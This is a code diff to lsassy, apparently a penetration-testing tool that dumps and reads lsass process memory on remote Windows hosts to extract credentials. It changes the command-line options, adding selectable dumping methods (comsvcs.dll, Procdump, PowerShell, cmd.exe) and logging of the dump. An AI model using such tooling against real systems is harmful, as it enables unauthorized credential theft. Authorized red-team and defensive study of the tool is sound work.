@@ -41,10 +41,9 @@ def run():
         prog="lsassy",
         description='lsassy v{} - Remote lsass dump reader'.format(version),
         epilog=examples,
-        formatter_class=argparse.RawDescriptionHelpFormatter
+        formatter_class=argparse.RawTextHelpFormatter
     )
-    group_auth = parser.add_argument_group('procdump (default DLL)')
-    group_auth.add_argument('-p', '--procdump', action='store', help='procdump path')
+
     group_auth = parser.add_argument_group('authentication')
     group_auth.add_argument('--hashes', action='store', help='[LM:]NT hash')
     group_out = parser.add_argument_group('output')
@@ -52,12 +51,19 @@ def run():
     group_out.add_argument('-g', '--grep', action='store_true', help='Print credentials in greppable format')
     group_extract = parser.add_argument_group('remote parsing only')
     group_extract.add_argument('--dumppath', action='store', help='lsass dump path (Format : c$/Temp/lsass.dmp)')
-    parser.add_argument('-r', '--raw', action='store_true', help='Raw results without filtering')
+    parser.add_argument('-m', '--method', action='store', default="1", help='''Dumping method
+    0: Try all methods to dump procdump, stop on success (Requires -p if dll method fails)
+    1: comsvcs.dll method, stop on success (default)
+    2: Procdump method, stop on success (Requires -p)
+    3: comsvcs.dll + Powershell method, stop on success
+    4: comsvcs.dll + cmd.exe method''')
+    parser.add_argument('--dumpname', action='store', help='Name given to lsass dump (Default: Random)')
+    parser.add_argument('-p', '--procdump', action='store', help='Procdump path')
+    parser.add_argument('-r', '--raw', action='store_true', help='No basic result filtering')
     parser.add_argument('-d', '--debug', action='store_true', help='Debug output')
     parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode, only display credentials')
     parser.add_argument('-V', '--version', action='version', version='%(prog)s (version {})'.format(version))
     parser.add_argument('target', action='store', help='[domain/]username[:password]@<host>')
-
 
     if len(sys.argv) == 1:
         parser.print_help()
@@ -71,14 +77,14 @@ def run():
     file_path = args.dumppath
 
     dumper = None
+
     if not args.dumppath:
         dumper = Dumper(conn, args, logger)
-        if args.procdump:
-            file_path = dumper.dump("procdump")
-        else:
-            file_path = dumper.dump("dll")
+        file_path = dumper.dump()
         if not file_path:
+            logger.error("lsass could not be dumped")
             exit()
+        logger.success("Process lsass.exe is being dumped")
 
     ifile = ImpacketFile(logger)
     ifile.open(conn, file_path)
